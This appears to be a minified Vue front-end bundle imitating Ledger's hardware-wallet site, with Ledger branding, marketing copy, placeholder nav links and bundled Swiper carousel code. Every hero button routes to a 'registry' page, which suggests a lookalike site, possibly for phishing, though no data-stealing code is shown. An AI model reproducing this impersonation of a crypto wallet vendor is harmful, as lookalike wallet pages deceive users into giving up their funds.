        d: "M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z"
    })], -1),
    vh = [mh];

function yh(e, t, s, n, i, r) {
    return O(), R("picture", fh, [s.dark ? (O(), R("div", ph, hh)) : (O(), R("div", gh, vh))])
}
const bh = Se(dh, [
        ["render", yh]
    ]),
    wh = {
        props: ["dark"],
        data() {
            return {
                isOpen: !1,
                links: [{
                    text: "Products",
                    sublinks: [{
                        text: "dfghjk"
                    }, {
                        text: "dfghjk"
                    }, {
                        text: "dfghjk"
                    }]
                }, {
                    text: "And and services",
                    sublinks: []
                }, {
                    text: "Learn",
                    sublinks: []
                }, {
                    text: "For Business",
                    sublinks: []
                }, {
                    text: "For developers"
                }, {
                    text: "Support"
                }, {
                    text: "English",
                    sublinks: []
                }]
            }
        },
        methods: {
            setIsOpen() {
                this.isOpen = !this.isOpen
            }
        },
        components: {
            Logo: bh
        }
    },
    xh = {
        class: "bg-lg-bg lg:bg-lg-bg z-50 stuck"
    },
    _h = {
        class: "container mx-auto px-5 py-5 flex md:px-10 justify-between items-center relative"
    },
    Ch = ["aria-expanded"],
    Sh = {
        class: "text-left px-5 md:px-0 lg:flex lg:justify-end lg:w-full lg:items-center gap-5 xl:gap-10"
    },
    Eh = {
        class: "p-0",
        href: "#"
    },
    Th = {
        key: 0,
        class: "ri-arrow-down-s-line text-lg font-[100]"
    },
    Ah = {
        class: "flex text-white text-lg gap-7"
    },
    Lh = f("button", null, [f("i", {
        class: "ri-shopping-cart-2-line"
    })], -1),
    Ih = {
        key: 0,
        class: "ri-close-fill text-2xl"
    },
    Nh = {
        key: 1,
        class: "ri-menu-3-line"
    };

function Ph(e, t, s, n, i, r) {
    const o = ce("Logo"),
        l = ce("router-link");
    return O(), R("header", xh, [f("div", _h, [q(l, {
        class: "w-24 lg:w-28",
        to: "/"
    }, {
        default: Mt(() => [q(o, {
            dark: s.dark
        }, null, 8, ["dark"])]),
        _: 1
    }), f("nav", {
        class: "nav-menu lg:mr-10 md:px-10",
        "aria-expanded": i.isOpen
    }, [f("ul", Sh, [(O(!0), R(he, null, Ke(i.links, a => (O(), R("li", {
        key: a.text,
        class: "text-xs xl:text-sm lg:text-[0.8rem] xl:text-[0.9rem] font-[600] mb-4 lg:mb-0"
    }, [f("a", Eh, [gt(ye(a.text) + " ", 1), a.sublinks ? (O(), R("i", Th)) : Ee("", !0)])]))), 128))])], 8, Ch), f("div", Ah, [Lh, f("button", {
        onClick: t[0] || (t[0] = (...a) => r.setIsOpen && r.setIsOpen(...a)),
        class: "lg:hidden"
    }, [i.isOpen ? (O(), R("i", Ih)) : (O(), R("i", Nh))])])])])
}
const Ro = Se(wh, [
        ["render", Ph]
    ]),
    Mh = "/images/Forbes@2x.webp",
    kh = "/images/Techcrunch@2x.webp",
    Oh = "/images/Bloomberg@2x.webp",
    $h = {
        name: "my_hero",
        methods: {
            goregistry() {
                this.$router.push("registry")
            }
        }
    },
    Rh = {
        class: "pb-10"
    },
    Dh = {
        class: "container mx-auto flex px-5 md:flex-row-reverse flex-col bg-lg-bg justify-between md:px-10 lg:pl-32 md:gap-10"
    },
    Hh = f("div", {
        class: "w-full self-stretch"
    }, [f("div", {
        class: "min-h-[360px] bg-hero-bg bg-cover bg-center relative w-full align-baseline h-full"
    })], -1),
    Vh = {
        class: "pt-10"
    },
    jh = f("h5", {
        class: "text-xs text-lg-orange font-[600] mb-5 lg:text-sm"
    }, " LEDGER HARDWARE WALLETS ", -1),
    Bh = f("h1", {
        class: "text-3xls text-white font-[500] mb-4 lg:text-5xl"
    }, " The smartest way to secure your crypto ", -1),
    Fh = f("p", {
        class: "mb-10 leading-relaxed text-white text-lgs lg:text-2xl"
    }, " Buy, exchange, grow and manage over 5,500 coins and tokens ", -1),
    zh = {
        class: "lg:inline-flex items-center mb-7 justify-start"
    },
    Uh = f("i", {
        class: "ri-arrow-right-line abs"
    }, null, -1),
    Gh = f("p", {
        class: "underline text-sm lg:text-lg"
    }, "Compare wallets", -1),
    Wh = f("i", {
        class: "ri-arrow-right-line text-sm"
    }, null, -1),
    qh = [Gh, Wh],
    Kh = f("div", null, [f("h6", {
        class: "text-[1.3rem] leading-7 font-[500] mb-1 lg:text-[1.5rem]"
    }, " Introducing Ledger Recover "), f("p", {
        class: "text-[1.05rem] leading-6 lg:text-[1.07rem]"
    }, " Restore access to your wallet whenever you need it ")], -1),
    Zh = f("i", {
        class: "ri-arrow-right-line text-3xl"
    }, null, -1),
    Xh = [Kh, Zh],
    Yh = vt('<div class="flex text-white text-xs w-max mx-auto lg:mx-0 gap-2 bg-[rgba(60,60,60,0.5)] rounded-md py-2 px-2 mt-7"><span class=""><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-fill"></i><i class="ri-star-half-fill"></i></span><p>Trusted by over 6 million customers</p></div><div class="flex flex-wrap gap-5 mt-5"><img src="' + Mh + '" alt="logo-img" class="h-5"><img src="' + kh + '" alt="logo-img" class="h-5"><img src="' + Oh + '" alt="logo-img" class="h-5"></div>', 2);

function Qh(e, t, s, n, i, r) {
    return O(), R("section", Rh, [f("div", Dh, [Hh, f("div", Vh, [jh, Bh, Fh, f("div", zh, [f("button", {
        class: "mx-auto text-white bg-lg-orange rounded-full block border-0 py-4 px-12 font-medium text-[1.09rem] orange-btn",
        onClick: t[0] || (t[0] = o => r.goregistry())
    }, [gt(" Shop "), Uh]), f("button", {
        class: "mx-auto lg:mb-0 text-white block border-0 py-4 px-12 font-semibold flex gap-2 items-center mb-5",
        onClick: t[1] || (t[1] = o => r.goregistry())
    }, qh)]), f("div", {
        class: "grad flex text-white items-center justify-between px-5 py-7 gap-3 rounded mb-10 lg:mb-20 lg:mt-5 hover:border-white duration-300",
        onClick: t[2] || (t[2] = o => r.goregistry())
    }, Xh), Yh])])])
}
const Jh = Se($h, [
    ["render", Qh]
]);

function bl(e) {
    return e !== null && typeof e == "object" && "constructor" in e && e.constructor === Object
}

function Do(e, t) {
    e === void 0 && (e = {}), t === void 0 && (t = {}), Object.keys(t).forEach(s => {
        typeof e[s] > "u" ? e[s] = t[s] : bl(t[s]) && bl(e[s]) && Object.keys(t[s]).length > 0 && Do(e[s], t[s])
    })
}
const fd = {
    body: {},
    addEventListener() {},
    removeEventListener() {},
    activeElement: {
        blur() {},
        nodeName: ""
    },
    querySelector() {
        return null
    },
    querySelectorAll() {
        return []
    },
    getElementById() {
        return null
    },
    createEvent() {
        return {
            initEvent() {}
        }
    },
    createElement() {
        return {
            children: [],
            childNodes: [],
            style: {},
            setAttribute() {},
            getElementsByTagName() {
                return []
            }
        }
    },
    createElementNS() {
        return {}
    },
    importNode() {
        return null
    },
    location: {
        hash: "",
        host: "",
        hostname: "",
        href: "",
        origin: "",
        pathname: "",
        protocol: "",
        search: ""
    }
};

function js() {
    const e = typeof document < "u" ? document : {};
    return Do(e, fd), e
}
const e0 = {
    document: fd,
    navigator: {
        userAgent: ""
    },
    location: {
        hash: "",
        host: "",
        hostname: "",
        href: "",
        origin: "",
        pathname: "",
        protocol: "",
        search: ""
    },
    history: {
        replaceState() {},
        pushState() {},
        go() {},
        back() {}
    },
    CustomEvent: function() {
        return this
    },
    addEventListener() {},
    removeEventListener() {},
    getComputedStyle() {
        return {
            getPropertyValue() {
                return ""
            }
        }
    },
    Image() {},
    Date() {},
    screen: {},
    setTimeout() {},
    clearTimeout() {},
    matchMedia() {
        return {}
    },
    requestAnimationFrame(e) {
        return typeof setTimeout > "u" ? (e(), null) : setTimeout(e, 0)
    },
    cancelAnimationFrame(e) {
        typeof setTimeout > "u" || clearTimeout(e)
    }
};

function st() {
    const e = typeof window < "u" ? window : {};
    return Do(e, e0), e
}

function t0(e) {
    return e === void 0 && (e = ""), e.trim().split(" ").filter(t => !!t.trim())
}

function s0(e) {
    const t = e;
    Object.keys(t).forEach(s => {
        try {
            t[s] = null
        } catch {}
        try {
            delete t[s]
        } catch {}
    })
}

function Gr(e, t) {
    return t === void 0 && (t = 0), setTimeout(e, t)
}

function ci() {
    return Date.now()
}

function n0(e) {
    const t = st();
    let s;
    return t.getComputedStyle && (s = t.getComputedStyle(e, null)), !s && e.currentStyle && (s = e.currentStyle), s || (s = e.style), s
}

function i0(e, t) {
    t === void 0 && (t = "x");
    const s = st();
    let n, i, r;
    const o = n0(e);
    return s.WebKitCSSMatrix ? (i = o.transform || o.webkitTransform, i.split(",").length > 6 && (i = i.split(", ").map(l => l.replace(",", ".")).join(", ")), r = new s.WebKitCSSMatrix(i === "none" ? "" : i)) : (r = o.MozTransform || o.OTransform || o.MsTransform || o.msTransform || o.transform || o.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,"), n = r.toString().split(",")), t === "x" && (s.WebKitCSSMatrix ? i = r.m41 : n.length === 16 ? i = parseFloat(n[12]) : i = parseFloat(n[4])), t === "y" && (s.WebKitCSSMatrix ? i = r.m42 : n.length === 16 ? i = parseFloat(n[13]) : i = parseFloat(n[5])), i || 0
}

function zn(e) {
    return typeof e == "object" && e !== null && e.constructor && Object.prototype.toString.call(e).slice(8, -1) === "Object"
}

function r0(e) {
    return typeof window < "u" && typeof window.HTMLElement < "u" ? e instanceof HTMLElement : e && (e.nodeType === 1 || e.nodeType === 11)
}

function Je() {
    const e = Object(arguments.length <= 0 ? void 0 : arguments[0]),
        t = ["__proto__", "constructor", "prototype"];
    for (let s = 1; s < arguments.length; s += 1) {
        const n = s < 0 || arguments.length <= s ? void 0 : arguments[s];
        if (n != null && !r0(n)) {
            const i = Object.keys(Object(n)).filter(r => t.indexOf(r) < 0);
            for (let r = 0, o = i.length; r < o; r += 1) {
                const l = i[r],
                    a = Object.getOwnPropertyDescriptor(n, l);
                a !== void 0 && a.enumerable && (zn(e[l]) && zn(n[l]) ? n[l].__swiper__ ? e[l] = n[l] : Je(e[l], n[l]) : !zn(e[l]) && zn(n[l]) ? (e[l] = {}, n[l].__swiper__ ? e[l] = n[l] : Je(e[l], n[l])) : e[l] = n[l])
            }
        }
    }
    return e
}

function Un(e, t, s) {
    e.style.setProperty(t, s)
}

function pd(e) {
    let {
        swiper: t,
        targetPosition: s,
        side: n
    } = e;
    const i = st(),
        r = -t.translate;
    let o = null,
        l;
    const a = t.params.speed;
    t.wrapperEl.style.scrollSnapType = "none", i.cancelAnimationFrame(t.cssModeFrameID);
    const c = s > r ? "next" : "prev",
        d = (u, g) => c === "next" && u >= g || c === "prev" && u <= g,
        p = () => {
            l = new Date().getTime(), o === null && (o = l);
            const u = Math.max(Math.min((l - o) / a, 1), 0),
                g = .5 - Math.cos(u * Math.PI) / 2;
            let w = r + g * (s - r);
            if (d(w, s) && (w = s), t.wrapperEl.scrollTo({
                    [n]: w
                }), d(w, s)) {
                t.wrapperEl.style.overflow = "hidden", t.wrapperEl.style.scrollSnapType = "", setTimeout(() => {
                    t.wrapperEl.style.overflow = "", t.wrapperEl.scrollTo({
                        [n]: w
                    })
                }), i.cancelAnimationFrame(t.cssModeFrameID);
                return
            }
            t.cssModeFrameID = i.requestAnimationFrame(p)
        };
    p()
}

function Ct(e, t) {
    return t === void 0 && (t = ""), [...e.children].filter(s => s.matches(t))
}

function di(e) {
    try {
        console.warn(e);
        return
    } catch {}
}

function fi(e, t) {
    t === void 0 && (t = []);
    const s = document.createElement(e);
    return s.classList.add(...Array.isArray(t) ? t : t0(t)), s
}

function o0(e, t) {
    const s = [];
    for (; e.previousElementSibling;) {
        const n = e.previousElementSibling;
        t ? n.matches(t) && s.push(n) : s.push(n), e = n
    }
    return s
}

function a0(e, t) {
    const s = [];
    for (; e.nextElementSibling;) {
        const n = e.nextElementSibling;
        t ? n.matches(t) && s.push(n) : s.push(n), e = n
    }
    return s
}

function Ut(e, t) {
    return st().getComputedStyle(e, null).getPropertyValue(t)
}

function pi(e) {
    let t = e,
        s;
    if (t) {
        for (s = 0;
            (t = t.previousSibling) !== null;) t.nodeType === 1 && (s += 1);
        return s
    }
}

function ud(e, t) {
    const s = [];
    let n = e.parentElement;
    for (; n;) t ? n.matches(t) && s.push(n) : s.push(n), n = n.parentElement;
    return s
}

function Wr(e, t, s) {
    const n = st();
    return s ? e[t === "width" ? "offsetWidth" : "offsetHeight"] + parseFloat(n.getComputedStyle(e, null).getPropertyValue(t === "width" ? "margin-right" : "margin-top")) + parseFloat(n.getComputedStyle(e, null).getPropertyValue(t === "width" ? "margin-left" : "margin-bottom")) : e.offsetWidth
}
let pr;

function l0() {
    const e = st(),
        t = js();
    return {
        smoothScroll: t.documentElement && t.documentElement.style && "scrollBehavior" in t.documentElement.style,
        touch: !!("ontouchstart" in e || e.DocumentTouch && t instanceof e.DocumentTouch)
    }
}

function hd() {
    return pr || (pr = l0()), pr
}
let ur;

function c0(e) {
    let {
        userAgent: t
    } = e === void 0 ? {} : e;
    const s = hd(),
        n = st(),
        i = n.navigator.platform,
        r = t || n.navigator.userAgent,
        o = {
            ios: !1,
            android: !1
        },
        l = n.screen.width,
        a = n.screen.height,
        c = r.match(/(Android);?[\s\/]+([\d.]+)?/);
    let d = r.match(/(iPad).*OS\s([\d_]+)/);
    const p = r.match(/(iPod)(.*OS\s([\d_]+))?/),
        u = !d && r.match(/(iPhone\sOS|iOS)\s([\d_]+)/),
        g = i === "Win32";
    let w = i === "MacIntel";
    const b = ["1024x1366", "1366x1024", "834x1194", "1194x834", "834x1112", "1112x834", "768x1024", "1024x768", "820x1180", "1180x820", "810x1080", "1080x810"];
    return !d && w && s.touch && b.indexOf(`${l}x${a}`) >= 0 && (d = r.match(/(Version)\/([\d.]+)/), d || (d = [0, 1, "13_0_0"]), w = !1), c && !g && (o.os = "android", o.android = !0), (d || u || p) && (o.os = "ios", o.ios = !0), o
}

function d0(e) {
    return e === void 0 && (e = {}), ur || (ur = c0(e)), ur
}
let hr;

function f0() {
    const e = st();
    let t = !1;

    function s() {
        const n = e.navigator.userAgent.toLowerCase();
        return n.indexOf("safari") >= 0 && n.indexOf("chrome") < 0 && n.indexOf("android") < 0
    }
    if (s()) {
        const n = String(e.navigator.userAgent);
        if (n.includes("Version/")) {
            const [i, r] = n.split("Version/")[1].split(" ")[0].split(".").map(o => Number(o));
            t = i < 16 || i === 16 && r < 2
        }
    }
    return {
        isSafari: t || s(),
        needPerspectiveFix: t,
        isWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(e.navigator.userAgent)
    }
}

function p0() {
    return hr || (hr = f0()), hr
}

function u0(e) {
    let {
        swiper: t,
        on: s,
        emit: n
    } = e;
    const i = st();
    let r = null,
        o = null;
    const l = () => {
            !t || t.destroyed || !t.initialized || (n("beforeResize"), n("resize"))
        },
        a = () => {
            !t || t.destroyed || !t.initialized || (r = new ResizeObserver(p => {
                o = i.requestAnimationFrame(() => {
                    const {
                        width: u,
                        height: g
                    } = t;
                    let w = u,
                        b = g;
                    p.forEach(S => {
                        let {
                            contentBoxSize: x,
                            contentRect: v,
                            target: y
                        } = S;
                        y && y !== t.el || (w = v ? v.width : (x[0] || x).inlineSize, b = v ? v.height : (x[0] || x).blockSize)
                    }), (w !== u || b !== g) && l()
                })
            }), r.observe(t.el))
        },
        c = () => {
            o && i.cancelAnimationFrame(o), r && r.unobserve && t.el && (r.unobserve(t.el), r = null)
        },
        d = () => {
            !t || t.destroyed || !t.initialized || n("orientationchange")
        };
    s("init", () => {
        if (t.params.resizeObserver && typeof i.ResizeObserver < "u") {
            a();
            return
        }
        i.addEventListener("resize", l), i.addEventListener("orientationchange", d)
    }), s("destroy", () => {
        c(), i.removeEventListener("resize", l), i.removeEventListener("orientationchange", d)
    })
}

function h0(e) {
    let {
        swiper: t,
        extendParams: s,
        on: n,
        emit: i
    } = e;
    const r = [],
        o = st(),
        l = function(d, p) {
            p === void 0 && (p = {});
            const u = o.MutationObserver || o.WebkitMutationObserver,
                g = new u(w => {
                    if (t.__preventObserver__) return;
                    if (w.length === 1) {
                        i("observerUpdate", w[0]);
                        return
                    }
                    const b = function() {
                        i("observerUpdate", w[0])
                    };
                    o.requestAnimationFrame ? o.requestAnimationFrame(b) : o.setTimeout(b, 0)
                });
            g.observe(d, {
                attributes: typeof p.attributes > "u" ? !0 : p.attributes,
                childList: typeof p.childList > "u" ? !0 : p.childList,
                characterData: typeof p.characterData > "u" ? !0 : p.characterData
            }), r.push(g)
        },
        a = () => {
            if (t.params.observer) {
                if (t.params.observeParents) {
                    const d = ud(t.hostEl);
                    for (let p = 0; p < d.length; p += 1) l(d[p])
                }
                l(t.hostEl, {
                    childList: t.params.observeSlideChildren
                }), l(t.wrapperEl, {
                    attributes: !1
                })
            }
        },
        c = () => {
            r.forEach(d => {
                d.disconnect()
            }), r.splice(0, r.length)
        };
    s({
        observer: !1,
        observeParents: !1,
        observeSlideChildren: !1
    }), n("init", a), n("destroy", c)
}
var g0 = {
    on(e, t, s) {
        const n = this;
        if (!n.eventsListeners || n.destroyed || typeof t != "function") return n;
        const i = s ? "unshift" : "push";
        return e.split(" ").forEach(r => {
            n.eventsListeners[r] || (n.eventsListeners[r] = []), n.eventsListeners[r][i](t)
        }), n
    },
    once(e, t, s) {
        const n = this;
        if (!n.eventsListeners || n.destroyed || typeof t != "function") return n;

        function i() {
            n.off(e, i), i.__emitterProxy && delete i.__emitterProxy;
            for (var r = arguments.length, o = new Array(r), l = 0; l < r; l++) o[l] = arguments[l];
            t.apply(n, o)
        }
        return i.__emitterProxy = t, n.on(e, i, s)
    },
    onAny(e, t) {
        const s = this;
        if (!s.eventsListeners || s.destroyed || typeof e != "function") return s;
        const n = t ? "unshift" : "push";
        return s.eventsAnyListeners.indexOf(e) < 0 && s.eventsAnyListeners[n](e), s
    },
    offAny(e) {
        const t = this;
        if (!t.eventsListeners || t.destroyed || !t.eventsAnyListeners) return t;
        const s = t.eventsAnyListeners.indexOf(e);
        return s >= 0 && t.eventsAnyListeners.splice(s, 1), t
    },
    off(e, t) {
        const s = this;
        return !s.eventsListeners || s.destroyed || !s.eventsListeners || e.split(" ").forEach(n => {
            typeof t > "u" ? s.eventsListeners[n] = [] : s.eventsListeners[n] && s.eventsListeners[n].forEach((i, r) => {
                (i === t || i.__emitterProxy && i.__emitterProxy === t) && s.eventsListeners[n].splice(r, 1)
            })
        }), s
    },
    emit() {
        const e = this;
        if (!e.eventsListeners || e.destroyed || !e.eventsListeners) return e;
        let t, s, n;
        for (var i = arguments.length, r = new Array(i), o = 0; o < i; o++) r[o] = arguments[o];
        return typeof r[0] == "string" || Array.isArray(r[0]) ? (t = r[0], s = r.slice(1, r.length), n = e) : (t = r[0].events, s = r[0].data, n = r[0].context || e), s.unshift(n), (Array.isArray(t) ? t : t.split(" ")).forEach(a => {
            e.eventsAnyListeners && e.eventsAnyListeners.length && e.eventsAnyListeners.forEach(c => {
                c.apply(n, [a, ...s])
            }), e.eventsListeners && e.eventsListeners[a] && e.eventsListeners[a].forEach(c => {
                c.apply(n, s)
            })
        }), e
    }
};

function m0() {
    const e = this;
    let t, s;
    const n = e.el;
    typeof e.params.width < "u" && e.params.width !== null ? t = e.params.width : t = n.clientWidth, typeof e.params.height < "u" && e.params.height !== null ? s = e.params.height : s = n.clientHeight, !(t === 0 && e.isHorizontal() || s === 0 && e.isVertical()) && (t = t - parseInt(Ut(n, "padding-left") || 0, 10) - parseInt(Ut(n, "padding-right") || 0, 10), s = s - parseInt(Ut(n, "padding-top") || 0, 10) - parseInt(Ut(n, "padding-bottom") || 0, 10), Number.isNaN(t) && (t = 0), Number.isNaN(s) && (s = 0), Object.assign(e, {
        width: t,
        height: s,
        size: e.isHorizontal() ? t : s
    }))
}

function v0() {
    const e = this;

    function t(P, F) {
        return parseFloat(P.getPropertyValue(e.getDirectionLabel(F)) || 0)
    }
    const s = e.params,
        {
            wrapperEl: n,
            slidesEl: i,
            size: r,
            rtlTranslate: o,
            wrongRTL: l
        } = e,
        a = e.virtual && s.virtual.enabled,
        c = a ? e.virtual.slides.length : e.slides.length,
        d = Ct(i, `.${e.params.slideClass}, swiper-slide`),
        p = a ? e.virtual.slides.length : d.length;
    let u = [];
    const g = [],
        w = [];
    let b = s.slidesOffsetBefore;
    typeof b == "function" && (b = s.slidesOffsetBefore.call(e));
    let S = s.slidesOffsetAfter;
    typeof S == "function" && (S = s.slidesOffsetAfter.call(e));
    const x = e.snapGrid.length,
        v = e.slidesGrid.length;
    let y = s.spaceBetween,
        C = -b,
        L = 0,
        M = 0;
    if (typeof r > "u") return;
    typeof y == "string" && y.indexOf("%") >= 0 ? y = parseFloat(y.replace("%", "")) / 100 * r : typeof y == "string" && (y = parseFloat(y)), e.virtualSize = -y, d.forEach(P => {
        o ? P.style.marginLeft = "" : P.style.marginRight = "", P.style.marginBottom = "", P.style.marginTop = ""
    }), s.centeredSlides && s.cssMode && (Un(n, "--swiper-centered-offset-before", ""), Un(n, "--swiper-centered-offset-after", ""));
    const se = s.grid && s.grid.rows > 1 && e.grid;
    se ? e.grid.initSlides(d) : e.grid && e.grid.unsetSlides();
    let W;
    const N = s.slidesPerView === "auto" && s.breakpoints && Object.keys(s.breakpoints).filter(P => typeof s.breakpoints[P].slidesPerView < "u").length > 0;
    for (let P = 0; P < p; P += 1) {
        W = 0;
        let F;
        if (d[P] && (F = d[P]), se && e.grid.updateSlide(P, F, d), !(d[P] && Ut(F, "display") === "none")) {
            if (s.slidesPerView === "auto") {
                N && (d[P].style[e.getDirectionLabel("width")] = "");
                const X = getComputedStyle(F),
                    V = F.style.transform,
                    te = F.style.webkitTransform;
                if (V && (F.style.transform = "none"), te && (F.style.webkitTransform = "none"), s.roundLengths) W = e.isHorizontal() ? Wr(F, "width", !0) : Wr(F, "height", !0);
                else {
                    const ne = t(X, "width"),
                        re = t(X, "padding-left"),
                        fe = t(X, "padding-right"),
                        ae = t(X, "margin-left"),
                        nt = t(X, "margin-right"),
                        dt = X.getPropertyValue("box-sizing");
                    if (dt && dt === "border-box") W = ne + ae + nt;
                    else {
                        const {
                            clientWidth: it,
                            offsetWidth: He
                        } = F;
                        W = ne + re + fe + ae + nt + (He - it)
                    }
                }
                V && (F.style.transform = V), te && (F.style.webkitTransform = te), s.roundLengths && (W = Math.floor(W))
            } else W = (r - (s.slidesPerView - 1) * y) / s.slidesPerView, s.roundLengths && (W = Math.floor(W)), d[P] && (d[P].style[e.getDirectionLabel("width")] = `${W}px`);
            d[P] && (d[P].swiperSlideSize = W), w.push(W), s.centeredSlides ? (C = C + W / 2 + L / 2 + y, L === 0 && P !== 0 && (C = C - r / 2 - y), P === 0 && (C = C - r / 2 - y), Math.abs(C) < 1 / 1e3 && (C = 0), s.roundLengths && (C = Math.floor(C)), M % s.slidesPerGroup === 0 && u.push(C), g.push(C)) : (s.roundLengths && (C = Math.floor(C)), (M - Math.min(e.params.slidesPerGroupSkip, M)) % e.params.slidesPerGroup === 0 && u.push(C), g.push(C), C = C + W + y), e.virtualSize += W + y, L = W, M += 1
        }
    }
    if (e.virtualSize = Math.max(e.virtualSize, r) + S, o && l && (s.effect === "slide" || s.effect === "coverflow") && (n.style.width = `${e.virtualSize+y}px`), s.setWrapperSize && (n.style[e.getDirectionLabel("width")] = `${e.virtualSize+y}px`), se && e.grid.updateWrapperSize(W, u), !s.centeredSlides) {
        const P = [];
        for (let F = 0; F < u.length; F += 1) {
            let X = u[F];
            s.roundLengths && (X = Math.floor(X)), u[F] <= e.virtualSize - r && P.push(X)
        }
        u = P, Math.floor(e.virtualSize - r) - Math.floor(u[u.length - 1]) > 1 && u.push(e.virtualSize - r)
    }
    if (a && s.loop) {
        const P = w[0] + y;
        if (s.slidesPerGroup > 1) {
            const F = Math.ceil((e.virtual.slidesBefore + e.virtual.slidesAfter) / s.slidesPerGroup),
                X = P * s.slidesPerGroup;
            for (let V = 0; V < F; V += 1) u.push(u[u.length - 1] + X)
        }
        for (let F = 0; F < e.virtual.slidesBefore + e.virtual.slidesAfter; F += 1) s.slidesPerGroup === 1 && u.push(u[u.length - 1] + P), g.push(g[g.length - 1] + P), e.virtualSize += P
    }
    if (u.length === 0 && (u = [0]), y !== 0) {
        const P = e.isHorizontal() && o ? "marginLeft" : e.getDirectionLabel("marginRight");
        d.filter((F, X) => !s.cssMode || s.loop ? !0 : X !== d.length - 1).forEach(F => {
            F.style[P] = `${y}px`
        })
    }
    if (s.centeredSlides && s.centeredSlidesBounds) {
        let P = 0;
        w.forEach(X => {
            P += X + (y || 0)
        }), P -= y;
        const F = P - r;
        u = u.map(X => X <= 0 ? -b : X > F ? F + S : X)
    }
    if (s.centerInsufficientSlides) {
        let P = 0;
        if (w.forEach(F => {
                P += F + (y || 0)
            }), P -= y, P < r) {
            const F = (r - P) / 2;
            u.forEach((X, V) => {
                u[V] = X - F
            }), g.forEach((X, V) => {
                g[V] = X + F
            })
        }
    }
    if (Object.assign(e, {
            slides: d,
            snapGrid: u,
            slidesGrid: g,
            slidesSizesGrid: w
        }), s.centeredSlides && s.cssMode && !s.centeredSlidesBounds) {
        Un(n, "--swiper-centered-offset-before", `${-u[0]}px`), Un(n, "--swiper-centered-offset-after", `${e.size/2-w[w.length-1]/2}px`);
        const P = -e.snapGrid[0],
            F = -e.slidesGrid[0];
        e.snapGrid = e.snapGrid.map(X => X + P), e.slidesGrid = e.slidesGrid.map(X => X + F)
    }
    if (p !== c && e.emit("slidesLengthChange"), u.length !== x && (e.params.watchOverflow && e.checkOverflow(), e.emit("snapGridLengthChange")), g.length !== v && e.emit("slidesGridLengthChange"), s.watchSlidesProgress && e.updateSlidesOffset(), e.emit("slidesUpdated"), !a && !s.cssMode && (s.effect === "slide" || s.effect === "fade")) {
        const P = `${s.containerModifierClass}backface-hidden`,
            F = e.el.classList.contains(P);
        p <= s.maxBackfaceHiddenSlides ? F || e.el.classList.add(P) : F && e.el.classList.remove(P)
    }
}

function y0(e) {
    const t = this,
        s = [],
        n = t.virtual && t.params.virtual.enabled;
    let i = 0,
        r;
    typeof e == "number" ? t.setTransition(e) : e === !0 && t.setTransition(t.params.speed);
    const o = l => n ? t.slides[t.getSlideIndexByData(l)] : t.slides[l];
    if (t.params.slidesPerView !== "auto" && t.params.slidesPerView > 1)
        if (t.params.centeredSlides)(t.visibleSlides || []).forEach(l => {
            s.push(l)
        });
        else
            for (r = 0; r < Math.ceil(t.params.slidesPerView); r += 1) {
                const l = t.activeIndex + r;
                if (l > t.slides.length && !n) break;
                s.push(o(l))
            } else s.push(o(t.activeIndex));
    for (r = 0; r < s.length; r += 1)
        if (typeof s[r] < "u") {
            const l = s[r].offsetHeight;
            i = l > i ? l : i
        }(i || i === 0) && (t.wrapperEl.style.height = `${i}px`)
}

function b0() {
    const e = this,
        t = e.slides,
        s = e.isElement ? e.isHorizontal() ? e.wrapperEl.offsetLeft : e.wrapperEl.offsetTop : 0;
    for (let n = 0; n < t.length; n += 1) t[n].swiperSlideOffset = (e.isHorizontal() ? t[n].offsetLeft : t[n].offsetTop) - s - e.cssOverflowAdjustment()
}

function w0(e) {
    e === void 0 && (e = this && this.translate || 0);
    const t = this,
        s = t.params,
        {
            slides: n,
            rtlTranslate: i,
            snapGrid: r
        } = t;
    if (n.length === 0) return;
    typeof n[0].swiperSlideOffset > "u" && t.updateSlidesOffset();
    let o = -e;
    i && (o = e), n.forEach(a => {
        a.classList.remove(s.slideVisibleClass, s.slideFullyVisibleClass)
    }), t.visibleSlidesIndexes = [], t.visibleSlides = [];
    let l = s.spaceBetween;
    typeof l == "string" && l.indexOf("%") >= 0 ? l = parseFloat(l.replace("%", "")) / 100 * t.size : typeof l == "string" && (l = parseFloat(l));
    for (let a = 0; a < n.length; a += 1) {
        const c = n[a];
        let d = c.swiperSlideOffset;
        s.cssMode && s.centeredSlides && (d -= n[0].swiperSlideOffset);
